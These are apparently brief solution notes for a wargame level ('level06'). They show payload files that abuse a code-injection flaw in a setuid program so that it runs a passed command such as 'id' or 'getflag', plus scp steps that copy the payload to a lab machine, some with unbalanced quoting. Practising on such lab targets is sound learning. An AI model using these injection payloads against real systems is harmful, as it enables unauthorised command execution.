#--------- CMD ---------

1. `echo 'hello' > /tmp/payload && ./level06 /tmp/payload`
    hello

2. `echo '[x $z]' > /tmp/payload && ./level06 /tmp/payload 'id'`
    id

3. `echo '[x ${ exec($z)}]' > /tmp/payload && ./level06 /tmp/payload 'getflag'`

#--------- SCP ---------

1. `scp -P 4242 ./level06/Ressources/payload level06@192.168.56.102:/tmp`
   `./send level06 ./level06/Ressources/payload`

2. `echo './level06 /tmp/payload 'getflag'`
   `echo './level06 ./payload' getflag`
